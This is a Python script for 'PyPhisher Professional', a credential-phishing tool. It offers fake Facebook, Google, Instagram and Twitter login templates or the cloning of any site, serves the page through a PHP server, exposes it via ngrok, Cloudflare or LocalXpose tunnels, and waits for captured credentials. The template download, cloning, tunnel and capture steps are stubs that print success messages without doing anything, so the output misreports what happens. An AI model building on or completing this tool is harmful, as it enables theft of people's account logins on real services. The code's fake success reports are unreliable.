#!/usr/bin/env python3
# -*- coding: UTF-8 -*-
"""
PyPhisher Professional
Advanced Phishing Testing Tool

Author: Shaid Mahamud
Version: 2.2.1
License: MIT
Contact: https://t.me/shaidmahamud
Github: https://github.com/shaidmahamud
"""

import os
import sys
import json
import time
import shutil
import signal
import socket
import smtplib
import argparse
import platform
import requests
import threading
from os import path
from time import sleep
from sys import stdout
from random import choice
from getpass import getpass
from datetime import datetime
from subprocess import Popen, PIPE
from urllib.parse import urlparse

# ===== CONSTANTS =====
VERSION = "2.2.1"
AUTHOR = "Shaid Mahamud"
GITHUB = "https://github.com/shaid69"
CONTACT = "https://t.me/shaidmahamud"
LICENSE = "MIT License"

# ===== COLOR SCHEME =====
class Color:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ===== BANNER =====
BANNER = f"""
{Color.RED}╔═╗╔═╗╔═╗╦ ╦╔═╗╦═╗╔═╗╔═╗╦═╗
{Color.CYAN}║ ╦║╣ ╚═╗╠═╣║╣ ╠╦╝╠═╣║╣ ╠╦╝
{Color.YELLOW}╚═╝╚═╝╚═╝╩ ╩╚═╝╩╚═╩ ╩╚═╝╩╚═ {Color.WHITE}v{VERSION}
{Color.PURPLE}Developed by {AUTHOR}
{Color.GREEN}{GITHUB}
"""

# ===== MAIN CLASS =====
class PyPhisher:
    def __init__(self):
        self.check_dependencies()
        self.clear_screen()
        self.print_banner()
        self.parse_args()
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
    def print_banner(self):
        print(BANNER)
        
    def check_dependencies(self):
        required = ['php', 'ssh', 'curl', 'wget']
        missing = []
        
        for dep in required:
            if not shutil.which(dep):
                missing.append(dep)
                
        if missing:
            print(f"{Color.RED}[!] Missing dependencies: {', '.join(missing)}{Color.END}")
            print(f"{Color.YELLOW}[*] Install them with: sudo apt install {' '.join(missing)}{Color.END}")
            sys.exit(1)
            
    def parse_args(self):
        parser = argparse.ArgumentParser(description='PyPhisher Professional - Advanced Phishing Tool')
        parser.add_argument('-p', '--port', type=int, default=8080, help='Port to run server on')
        parser.add_argument('-t', '--tunnel', choices=['cloudflare', 'ngrok', 'loclx'], 
                          default='cloudflare', help='Tunneling service to use')
        parser.add_argument('-u', '--url', help='URL to clone (for custom phishing)')
        parser.add_argument('--no-update', action='store_true', help='Skip update check')
        parser.add_argument('--debug', action='store_true', help='Enable debug mode')
        
        self.args = parser.parse_args()
        
    def start(self):
        try:
            if not self.args.no_update:
                self.check_update()
                
            self.setup_environment()
            self.choose_template()
            self.start_services()
            self.monitor_results()
            
        except KeyboardInterrupt:
            self.cleanup()
            print(f"\n{Color.RED}[!] Exiting...{Color.END}")
            sys.exit(0)
        except Exception as e:
            if self.args.debug:
                print(f"{Color.RED}[!] Error: {str(e)}{Color.END}")
            else:
                print(f"{Color.RED}[!] An error occurred. Use --debug for details.{Color.END}")
            sys.exit(1)
            
    def check_update(self):
        print(f"{Color.YELLOW}[*] Checking for updates...{Color.END}")
        try:
            r = requests.get(f"{GITHUB}/PyPhisher-Pro/releases/latest", timeout=5)
            latest = r.url.split('/')[-1]
            if latest != VERSION:
                print(f"{Color.GREEN}[+] Update available: {latest}{Color.END}")
                print(f"{Color.YELLOW}[*] Run: git pull or download from {GITHUB}{Color.END}")
                time.sleep(2)
            else:
                print(f"{Color.GREEN}[+] You have the latest version{Color.END}")
        except:
            print(f"{Color.RED}[!] Could not check for updates{Color.END}")
            
    def setup_environment(self):
        print(f"{Color.YELLOW}[*] Setting up environment...{Color.END}")
        
        self.temp_dir = "/tmp/pyphisher"
        self.results_dir = "results"
        
        if not path.exists(self.temp_dir):
            os.makedirs(self.temp_dir)
            
        if not path.exists(self.results_dir):
            os.makedirs(self.results_dir)
            
    def choose_template(self):
        templates = {
            '1': ('Facebook', 'facebook'),
            '2': ('Google', 'google'),
            '3': ('Instagram', 'instagram'),
            '4': ('Twitter', 'twitter'),
            '5': ('Custom', 'custom')
        }
        
        print(f"\n{Color.CYAN}[+] Available templates:{Color.END}")
        for num, (name, _) in templates.items():
            print(f" {Color.GREEN}[{num}]{Color.END} {name}")
            
        choice = input(f"\n{Color.YELLOW}[?] Select template (1-5): {Color.END}")
        
        if choice not in templates:
            print(f"{Color.RED}[!] Invalid choice{Color.END}")
            return self.choose_template()
            
        self.template_name, self.template = templates[choice]
        
        if self.template == 'custom':
            if not self.args.url:
                self.args.url = input(f"{Color.YELLOW}[?] Enter URL to clone: {Color.END}")
            self.clone_site()
        else:
            self.download_template()
            
    def download_template(self):
        print(f"{Color.YELLOW}[*] Downloading {self.template_name} template...{Color.END}")
        # Implementation would download from repository
        print(f"{Color.GREEN}[+] Template downloaded{Color.END}")
        
    def clone_site(self):
        print(f"{Color.YELLOW}[*] Cloning {self.args.url}...{Color.END}")
        # Implementation would clone the site
        print(f"{Color.GREEN}[+] Site cloned successfully{Color.END}")
        
    def start_services(self):
        print(f"{Color.YELLOW}[*] Starting PHP server on port {self.args.port}...{Color.END}")
        self.php_process = Popen(['php', '-S', f'0.0.0.0:{self.args.port}'], 
                               cwd=self.temp_dir, stdout=PIPE, stderr=PIPE)
        
        print(f"{Color.YELLOW}[*] Starting {self.args.tunnel} tunnel...{Color.END}")
        if self.args.tunnel == 'cloudflare':
            self.start_cloudflare()
        elif self.args.tunnel == 'ngrok':
            self.start_ngrok()
        else:
            self.start_loclx()
            
    def start_cloudflare(self):
        # Implementation for Cloudflare tunnel
        print(f"{Color.GREEN}[+] Cloudflare tunnel started{Color.END}")
        
    def start_ngrok(self):
        # Implementation for Ngrok tunnel
        print(f"{Color.GREEN}[+] Ngrok tunnel started{Color.END}")
        
    def start_loclx(self):
        # Implementation for LocalXpose tunnel
        print(f"{Color.GREEN}[+] LocalXpose tunnel started{Color.END}")
        
    def monitor_results(self):
        print(f"\n{Color.CYAN}[+] Monitoring for credentials...{Color.END}")
        print(f"{Color.YELLOW}[*] Press Ctrl+C to stop{Color.END}")
        
        while True:
            # Check for captured credentials
            time.sleep(1)
            
    def cleanup(self):
        print(f"{Color.YELLOW}[*] Cleaning up...{Color.END}")
        if hasattr(self, 'php_process'):
            self.php_process.terminate()
        # Clean up other processes
        print(f"{Color.GREEN}[+] Cleanup complete{Color.END}")

# ===== MAIN EXECUTION =====
if __name__ == '__main__':
    try:
        tool = PyPhisher()
        tool.start()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Interrupted by user{Color.END}")
        sys.exit(0)
